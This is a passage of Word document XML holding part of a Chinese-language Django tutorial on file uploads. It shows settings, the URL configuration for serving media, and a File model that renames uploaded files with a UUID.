          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CB56E40" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>INSTALLED_APPS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B22E84" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.admin',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7E77DD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.auth',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8254EC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.contenttypes',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77566EFB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.sessions',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B984E3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.messages',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2278ADD6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.staticfiles',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE3CFEA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'file_upload',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C044AA3" w14:textId="0AB1B7C6" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB02024" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#file_project/settings.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0FE7D6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATIC_URL = '/static/'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6643ADF1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATICFILES_DIRS = [os.path.join(BASE_DIR, "static"), ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A36C6C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EF93423" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># specify media root for user uploaded files,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2613EAA3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MEDIA_ROOT = os.path.join(BASE_DIR, 'media')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F98FC7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MEDIA_URL = '/media/'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECDBF25" w14:textId="651D23F6" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="362AE5E1" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#file_project/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECD8481" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib import admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E78047" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path, include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5093209E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.conf import settings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E7D10E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.conf.urls.static import static</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472DE087" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="430DF710" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722AA107" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('admin/', admin.site.urls),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C172789" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('file/', include("file_upload.urls")),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C1B0E5" w14:textId="68706D1F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FAC17F5" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="381FF8E2" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建模型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9BB8B7" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用Django上传文件创建模型不是必需，然而如果我们需要对上传文件进行系统化管理，模型还是很重要的。我们的File模型包括file和upload_method两个字段。我们通过upload_to选项指定了文件上传后存储的地址，并对上传的文件进行了重命名。如果你想了解如何自定义用户上传文件夹地址和对上传文件进行重命名，请阅读</w:t>
      </w:r>
      <w:hyperlink r:id="rId273" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>这里</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0A0A51" w14:textId="5F549479" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E3A83FF"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#file_upload/models.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8EBFF0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DE229B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B1C721" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import uuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EBE7AC4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47B47415" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your models here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612FCEDE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Define user directory path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2387FC52" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="787593C5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def user_directory_path(instance, filename):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DEB723" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ext = filename.split('.')[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16EC815A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    filename = '{}.{}'.format(uuid.uuid4().hex[:10], ext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3273EDD6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return os.path.join("files", filename)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29914E1B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D1B8AAE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F6496A2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class File(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00185B93" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    file = models.FileField(upload_to=user_directory_path, null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E67472" w14:textId="60F3B29F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    upload_method = models.CharField(max_length=20, verbose_name="Upload Method")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250E3D11" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E496E33" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你不使用ModelForm，你还需要手动编写代码存储上传文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521556C5" w14:textId="417DD9C3" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17AE9EE8" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>URLConf配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2112EDDE" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
